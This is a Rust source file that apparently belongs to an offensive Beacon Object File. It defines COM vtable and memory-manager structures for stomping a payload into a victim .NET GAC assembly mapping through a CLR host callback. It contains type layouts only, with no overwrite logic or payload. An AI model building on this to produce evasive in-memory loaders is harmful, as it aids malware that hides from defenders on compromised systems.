use crate::comptr::IUnknownVtbl;
use crate::host_control::HostMallocObject;
use core::ffi::c_void;

/// Payload bytes that are stomped into the victim GAC mapping.
/// Allocated via GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT); persists across BOF returns.
#[repr(C)]
pub struct StompPayload {
    pub payload_bytes: *mut u8,
    pub payload_size: usize,
    /// SizeOfImage from the payload PE Optional Header — used for victim size check.
    pub image_size: usize,
    /// Set to 1 before Load_2; cleared to 0 after Load_2 returns regardless of result.
    pub pending: i32,
    /// Set to 1 in AcquiredVirtualAddressSpace on successful stomp.
    pub stomped: i32,
}

/// IHostMemoryManager vtable (13 methods: IUnknown + CreateMalloc + 9 pass-throughs
/// + AcquiredVirtualAddressSpace + ReleasedVirtualAddressSpace).
#[repr(C)]
pub struct IHostMemoryManagerVtbl {
    pub base: IUnknownVtbl,
    /// CreateMalloc(dwMallocType: u32, ppMalloc: *mut *mut IHostMalloc) -> HRESULT — index 3
    pub create_malloc: unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32,
    /// VirtualAlloc — index 4
    pub virtual_alloc: unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32, u32, *mut *mut c_void) -> i32,
    /// VirtualFree — index 5
    pub virtual_free: unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32) -> i32,
    /// VirtualQuery — index 6
    pub virtual_query: unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void, usize, *mut usize) -> i32,
    /// VirtualProtect (host-side, not the Win32 API) — index 7
    pub virtual_protect_host: unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, *mut u32) -> i32,
    /// GetMemoryLoad — index 8
    pub get_memory_load: unsafe extern "system" fn(*mut c_void, *mut u32, *mut usize) -> i32,
    /// RegisterMemoryNotificationCallback — index 9
    pub register_memory_notification_cb: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32,
    /// NeedsVirtualAddressSpace — index 10
    pub needs_virtual_address_space: unsafe extern "system" fn(*mut c_void, *mut c_void, usize) -> i32,
    /// AcquiredVirtualAddressSpace — index 11 — THE STOMP CALLBACK
    pub acquired_virtual_address_space: unsafe extern "system" fn(*mut c_void, *mut c_void, usize) -> i32,
    /// ReleasedVirtualAddressSpace — index 12
    pub released_virtual_address_space: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32,
}

/// In-memory layout of a MemoryManager COM instance. GlobalAlloc'd; persists across
/// BOF returns.
#[repr(C)]
pub struct MemoryManagerObject {
    pub vtbl: *const IHostMemoryManagerVtbl,
    pub ref_count: i32,
    pub stomp_payload: *mut StompPayload,
    pub malloc_obj: *mut HostMallocObject,
}
